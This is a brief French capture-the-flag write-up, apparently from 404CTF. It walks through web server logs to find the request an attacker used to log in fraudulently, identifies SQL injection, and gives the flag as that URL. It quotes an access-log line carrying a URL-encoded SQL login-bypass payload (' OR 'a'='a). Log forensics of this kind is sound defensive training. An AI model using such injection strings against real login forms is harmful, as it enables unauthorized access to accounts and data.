On doit trouver l'URL utilisée par un attaquant qui lui as permis de se connecter de maniere frauduleuse

Probabilité haute  = inejction SQL 

On trouve dans une partie des logs des requêtes avec LIKE, AND etc donc une requête SQL
La ligne qui lance le début de l'injection est ici 

* 146.70.147.101 - - [19/Feb/2024:19:25:53 -0500] "GET /index.php?username=+%22OR+%27a%27%3D%27a&password=test HTTP/1.1" 200 662 "http://www.inscription_tir_arc.com/index.php?username=+%27OR+%27a%27%3D%27a&password=test" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"

On extrait le lien et on obtient le flag : 
404CTF{http://www.inscription_tir_arc.com/index.php?username=+%27OR+%27a%27%3D%27a&password=test}

